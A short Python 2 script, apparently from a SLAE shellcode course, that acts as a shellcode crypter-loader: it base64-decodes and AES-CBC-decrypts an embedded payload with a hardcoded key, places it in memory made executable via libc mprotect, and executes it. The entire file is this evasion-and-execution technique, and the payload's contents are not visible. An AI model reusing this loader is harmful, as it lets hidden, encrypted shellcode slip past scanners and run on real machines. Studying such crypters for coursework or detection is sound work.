import base64

from ctypes import *
from Crypto import Random
from Crypto.Cipher import AES

BLOCK_SIZE = 16
DecryptAES = lambda s : s[0:-ord(s[-1])]

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return DecryptAES(cipher.decrypt( enc[16:] ))

cipher = AESCipher('SLAEsecuritytube')
encrypted =  "D5YVw+i6VSzs58iLbxhtGG9JLgI1gb4bSEvexqB3utx/PDUx1WwXQ/fpx6v3gbIC" # Encrypted Shellcode
decrypted = cipher.decrypt(encrypted)

print 'Executes decypted shellcode:\n'

libc = CDLL('libc.so.6')
sc = c_char_p(decrypted)
size = len(decrypted)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
